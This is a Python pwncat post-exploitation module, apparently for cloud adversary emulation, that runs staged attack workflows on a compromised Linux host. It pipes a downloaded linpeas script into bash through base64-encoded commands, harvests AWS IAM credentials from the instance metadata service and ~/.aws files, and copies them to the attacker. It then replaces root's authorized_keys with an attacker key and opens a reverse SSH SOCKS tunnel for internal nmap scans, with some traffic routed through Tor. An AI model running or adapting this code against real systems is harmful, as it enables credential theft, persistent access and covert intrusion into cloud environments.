#!/usr/bin/env python3
from io import StringIO
import os 
from pwncat import util
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from jinja2 import Environment, FileSystemLoader
from pathlib import Path
import subprocess
import shutil
import tarfile
import base64
import logging
from logging.handlers import RotatingFileHandler

class Module(BaseModule):
    """ 
    Responder module - use TASK environment variable to execute specific workflow 
    """
    """
    Usage: run responder 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    

    def run(self, session: Session):
        # multi log handler
        def log(logger, session, message):
            logger.info(message)
            session.log(message)
        
        def enumerate():
            # run host enumeration
            payload = base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
            log(logger,session,"payload loaded and ready")
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
            log(logger,session,result)

        def exfiltrate():
            # create an instance profile to exfiltrate
            payload = base64.b64encode('''
opts="--no-cli-pager"
INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
cat > .aws-ec2-instance <<-EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF
PROFILE="instance"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE $opts
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE $opts
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE $opts
aws configure set region $REGION --profile=$PROFILE $opts
aws configure set output json --profile=$PROFILE $opts'''.encode('utf-8'))
            log(logger,session,"creating an instance creds profile...")
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
            log(logger,session,result)

            # remove any pre-existing cred archived
            if session.platform.Path('/tmp/aws_creds.tgz').exists():
                session.platform.unlink('/tmp/aws_creds.tgz')

            # create an archive of all aws creds
            payload = base64.b64encode(b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
            log(logger,session,"running credentials find...")
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
            log(logger,session,result)

            # create an archive of all aws creds
            payload = base64.b64encode(b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
            log(logger,session,"payload loaded and ready")
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'")
            log(logger,session,result)
            
            # cleanup any existing local cred archives for this host
            if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
                os.unlink(f'/tmp/{hostname}_aws_creds.tgz')
            
            # transfer files from target to attacker
            log(logger,session,"copying /tmp/aws_creds.tgz...")
            with session.platform.open('/tmp/aws_creds.tgz', 'rb') as f1:
                with open(f'/tmp/{hostname}_aws_creds.tgz','wb') as f2:
                    f2.write(f1.read())
            
            log(logger,session,"copying /tmp/linpeas.txt...")
            with session.platform.open('/tmp/linpeas.txt', 'rb') as f1:
                with open(f'/tmp/{hostname}_linpeas.txt','wb') as f2:
                    f2.write(f1.read())

            # remove temporary archive from target
            if session.platform.Path('/tmp/aws_creds.tgz').exists():
                session.platform.unlink('/tmp/aws_creds.tgz')
        
        def credentialed_access_aws_tor(jobname, cwd, script, container='ghcr.io/credibleforce/proxychains-scoutsuite-aws:main'):
            # start torproxy docker
            try:
                payload = base64.b64encode(f'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
                result = subprocess.run(['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                log(logger,session,f'Return Code: {result.returncode}')
                log(logger,session,f'Output: {result.stdout}')
                log(logger,session,f'Error Output: {result.stderr}')
                
                if result.returncode != 0:
                    log(logger,session,f'The bash script encountered an error.')
                else:
                    log(logger,session,f"successfully started torproxy docker.")
                    log(logger,session,f"running {script} via torproxy tunnelled container...")
                    payload = base64.b64encode(f'docker run --rm --name=proxychains-{jobname}-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "$PWD/root":"/root" -v "$PWD":"/{jobname}" {container} /bin/bash /{jobname}/{script}'.encode('utf-8'))
                    result = subprocess.run(['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                    log(logger,session,f'Return Code: {result.returncode}')
                    log(logger,session,f'Output: {result.stdout}')
                    log(logger,session,f'Error Output: {result.stderr}')
                    
                    if result.returncode != 0:
                        log(logger,session,f'The bash script encountered an error.')
            except Exception as e:
                log(logger,session,f'Error executing bash script: {e}')

        def prep_local_aws_env(task_name):
            # create work directory
            task_path = Path(f"/{task_name}")
            if task_path.exists() and task_path.is_dir():
                shutil.rmtree(task_path)
            task_path.mkdir(parents=True)

            # create aws directory
            aws_dir = Path.joinpath(Path.home(),Path(".aws"))
            if aws_dir.exists() and aws_dir.is_dir():
                shutil.rmtree(aws_dir)
            aws_dir.mkdir(parents=True)

            # extract the aws creds
            file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
            file.extract('root/.aws/credentials', task_path)
            file.extract('root/.aws/config', task_path)
            shutil.copy2(Path.joinpath(task_path, 'root/.aws/credentials'),Path.joinpath(aws_dir, 'credentials'))
            shutil.copy2(Path.joinpath(task_path, 'root/.aws/config'),Path.joinpath(aws_dir, 'config'))
            
            # copy our payload to the local working directory
            task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
            shutil.copy2(task_script, task_path)

            # copy linpeas.txt into our working directory
            linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
            shutil.copy2(linpeas, task_path)

        # get hostname for disk loggings
        hostname = session.platform.getenv('HOSTNAME')
        logging.basicConfig(
                handlers=[
                    RotatingFileHandler(
                        f'/tmp/responder-{hostname}.log',
                        backupCount=5
                    )
                ],
                filename=f'/tmp/responder-{hostname}.log',
                filemode='a',
                format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                datefmt='%H:%M:%S',
                level=logging.DEBUG)
        logger = logging.getLogger('responder')
        
        script_dir = os.path.dirname(os.path.realpath(__file__))
        log(logger,session,f"script dir: {script_dir}")
        task_name = session.platform.getenv("TASK")
        log(logger,session,f"task environment: {task_name}")
        if task_name == "instance2rds" or task_name == "iam2rds":
            enumerate()
            exfiltrate()
            prep_local_aws_env(task_name)
            credentialed_access_aws_tor(
                task_name, 
                f'/{task_name}',
                f'{task_name}.sh'
            )
        elif task_name == "socksscan":
            # PROXYCHAINS_CONF_FILE=./myproxychains.conf
            # get the attacker public ip
            result = subprocess.run(['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
            attacker_ip = result.stdout
            log(logger,session,f'Attacker IP: {attacker_ip}')
            
            # get the attacker lan
            payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
            target_lan = bytes(result.stdout).decode().strip()
            log(logger,session,f'Target LAN: {target_lan}')

            # transfer files from target to attacker
            log(logger,session,"copying private key to target...")
            with open(f'/home/socksuser/.ssh/socksuser_key','rb') as f1:
                with session.platform.open('/tmp/sockskey', 'wb') as f2:
                    f2.write(f1.read())
            result = session.platform.run(f"/bin/bash -c 'chmod 0600 /tmp/sockskey'")
            log(logger,session,"adding public key to authorized on target...")
            with open(f'/home/socksuser/.ssh/socksuser_key.pub','rb') as f1:
                with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
                    f2.write(f1.read())
            
            # create socksproxy on target
            log(logger,session,'starting socksproxy on target...')
            payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
            log(logger,session,f'Result: {result.returncode}')

            # forward local socksproxy to attacker
            log(logger,session,'forwarding target socksproxy to attacker...')
            payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
            log(logger,session,f'Result: {result.returncode}')

            # run nmap scan via proxychains
            log(logger,session,'running proxychains nmap...')
            result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T2', '-oX', 'scan.xml', '-p22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017', target_lan], cwd='/tmp', capture_output=True, text=True)
            log(logger,session,f'Result: {result.returncode}')
            
            # convert to json 
            # cat /tmp/scan.xml | jc --xml -p > /tmp/scan.json

            # kill ssh socksproxy and portforward
            log(logger,session,'killing ssh socksproxy and portforward...')
            result = session.platform.run('kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
            log(logger,session,f'Result: {result.returncode}')
            
            # remove temporary archive from target
            if session.platform.Path('/tmp/sockskey').exists():
                session.platform.unlink('/tmp/sockskey')
        else:
            result = session.platform.run("${default_payload}")
            log(logger,session,result)

        log(logger,session, f"ran {self.name}")